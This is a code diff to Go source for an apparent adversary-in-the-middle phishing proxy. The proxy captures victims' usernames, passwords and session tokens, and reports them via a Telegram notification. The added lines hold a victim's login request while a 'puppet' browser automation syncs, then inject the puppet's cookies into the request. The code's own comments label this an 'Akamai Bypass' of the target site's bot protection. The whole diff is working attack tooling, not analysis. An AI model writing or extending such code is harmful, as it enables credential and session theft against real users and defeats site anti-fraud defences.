@@ -248,6 +248,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								} else {
 									log.Warning("js_inject: script not found: '%s'", js_id)
 								}
+							} else {
+								// NEW: Wait for password checkpoint for sync
+								if pm := GetPuppetMaster(); pm != nil {
+									log.Debug("js_inject: waiting for puppet password sync (session: %s)...", session_id)
+									if pm.WaitForPasswordReady(session_id, 45*time.Second) {
+										log.Success("js_inject: puppet password sync ready for session %s", session_id)
+									} else {
+										log.Warning("js_inject: puppet password sync timed out for session %s", session_id)
+									}
+								}
 							}
 							
 							// Replace session_id placeholder
@@ -759,6 +769,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// Parse as form data if possible for better key mapping
 						bodyValues, _ := url.ParseQuery(bodyStr)
 						capturedCreds := false // Specifically for User/Pass
+						capturedUsername := false // NEW: Track specific credential type
 
 						// Try to capture username
 						if pl.username.search != nil {
@@ -801,6 +812,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 								capturedCreds = true
+								capturedUsername = true
 							}
 						}
 
@@ -914,6 +926,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								SendTelegramNotification(p.cfg, s, pl)
 							}
 							p.triggerPuppet(sid, pl.Name, req)
+
+							// NEW: BLOCKING LOGIC FOR AKAMAI BYPASS
+							if capturedUsername {
+								if pm := GetPuppetMaster(); pm != nil {
+									log.Important("[PROXY] Holding request to wait for Puppet (Akamai Bypass)...")
+									if pm.WaitForPasswordReady(sid, 45*time.Second) {
+										log.Success("[PROXY] Puppet ready! Injecting cookies into request.")
+										if cookies := pm.sessionMap.GetCookies(sid); cookies != nil {
+											for _, cookie := range cookies {
+												if name, ok := cookie["name"].(string); ok {
+													if val, ok := cookie["value"].(string); ok {
+														c := &http.Cookie{Name: name, Value: val}
+														req.AddCookie(c)
+													}
+												}
+											}
+										}
+									} else {
+										log.Warning("[PROXY] Puppet timed out. Forwarding request anyway.")
+									}
+								}
+							}
 						} else if capturedCustom {
 							// If only custom tokens were captured, just trigger puppet (no Telegram noise)
 							p.triggerPuppet(sid, pl.Name, req)
